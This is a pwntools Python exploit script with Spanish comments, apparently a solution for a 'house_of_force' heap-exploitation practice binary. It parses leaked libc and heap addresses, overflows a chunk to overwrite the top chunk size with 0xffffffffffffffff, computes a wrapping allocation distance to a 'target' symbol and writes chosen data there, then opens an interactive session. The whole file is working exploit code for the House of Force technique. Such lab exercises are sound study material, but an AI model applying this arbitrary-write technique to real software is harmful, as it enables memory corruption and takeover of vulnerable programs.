#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_force")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# ejecuta la opción malloc, envia tamaño y datos
def malloc(size, data):
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")


io = start()

# leak libc dirección puts
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# Leak heap
io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil("> ")
io.timeout = 0.1

#Reservamos chunk y desbordamos cambiando el top chunk a 0xffffffffffffffff
malloc(24, b"Y"*24 + p64(0xffffffffffffffff))

#Calculamos el tamaño del siguiente malloc para escribir donde queremos
# 0xffffffffffffffff - heap + 0x20 Esto es la distancia desde el chunk actual hasta el final de la memoria
# Sumamos hasta donde queremos escribir.
# El tamaño del siguiente malloc sobresale del final de la memoria virtual pero libc lo hace circular y comienza en el principio
distance = (0xffffffffffffffff - heap + 0x20) + elf.sym.target - 0x20

log.info(f"distance {distance}")

#Este malloc reserva un chunk enorme hasta llegar donde queremos escribir
malloc(distance, "Y")

#Este malloc reserva un nuevo chunk y escribimos los datos en el distino objetivo
malloc(24, "DATOS ESCRITOS!!!!!!!!!!!!")

io.interactive()
